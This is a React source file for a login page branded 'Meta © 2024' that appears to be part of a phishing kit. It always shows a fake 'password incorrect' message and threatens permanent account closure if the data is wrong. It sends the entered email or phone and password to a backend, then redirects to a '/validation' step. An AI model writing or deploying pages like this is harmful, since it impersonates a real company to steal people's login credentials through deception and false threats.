import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import './Login.css';
import logo from './logo.svg'; 

function Wrong() {
  const navigate = useNavigate();
  const [emailOrMobile, setEmailOrMobile] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');

  
  
  const handleSubmit = async (event) => {
    event.preventDefault();
    if (!emailOrMobile) {
      setError('Please enter your email or mobile number.');
      return;
    }
    if (!password) {
      setError('Please enter your password.');
      return;
    }
    if (!/\S+@\S+\.\S+/.test(emailOrMobile) && !/^\d{10,}$/.test(emailOrMobile)) {
      setError('Please enter a valid email or mobile number.');
      return;
    }
    if (password.length < 6) {
      setError('Your password must be at least 6 characters.');
      return;
    }
    
    setError(''); // Clear any previous errors

    // Attempt to send request to server
    try {
      const response = await fetch('http://localhost:5000/login', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ emailOrMobile, password }),
      });
      const data = await response.text();
      console.log(data);
      navigate('/validation');
    } catch (error) {
      setError('Failed to connect to the server.');
    }
  };

  return (
    
    <div className="login-container">
        <header className="login-header">
        <img src={logo} alt="Logo" className="login-logo" />
       </header>

      <form onSubmit={handleSubmit} className="login-form">
        <input
          type="text"
          placeholder="Mobile number or email address"
          value={emailOrMobile}
          onChange={(e) => setEmailOrMobile(e.target.value)}
          className="login-input"
        />
        <input
          type="password"
          placeholder="Password"
          value={password}
          onChange={(e) => setPassword(e.target.value)}
          className="login-input"
        />
        <p className="error-wrong">The password that you've entered is incorrect!</p> 
        {error && <div className="login-error">{error}</div>}
        
      
        <button type="submit" className="login-button">Verification</button>
        <div className="login-links">
      
        </div>
        <div className="login-divider"></div>
        <p className="last-warning">Please make sure to fill in the data correctly, if you fill in the wrong data your account will be permanently closed. To learn more about why we deactivate accounts</p> {/* Teks deskripsi di sini */}
      </form>
      <p className="footer">Meta © 2024</p> {/* Teks deskripsi di sini */}
    </div>
  );
}


export default Wrong;
